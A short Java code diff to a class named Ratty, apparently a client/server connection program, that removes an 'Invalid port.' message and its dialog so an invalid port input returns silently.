@@ -22,7 +22,6 @@ public final class Ratty {
 	private static boolean client;
 	
 	private static final String PORT_INPUT_MESSAGE = "Which port should the server be bind to?";
-	private static final String INVALID_PORT_MESSAGE = "Invalid port.";
 	
 	private static final int CONNECTION_INTERVAL = 2500;
 	private static final String CONNECTION_DATA_FILE_NAME = "/connection_data.txt";
@@ -123,8 +122,6 @@ public final class Ratty {
 			final int port = getPortInput();
 			
 			if (port == -1) {
-				JOptionPane.showMessageDialog(null, INVALID_PORT_MESSAGE);
-				
 				return;
 			}
 			
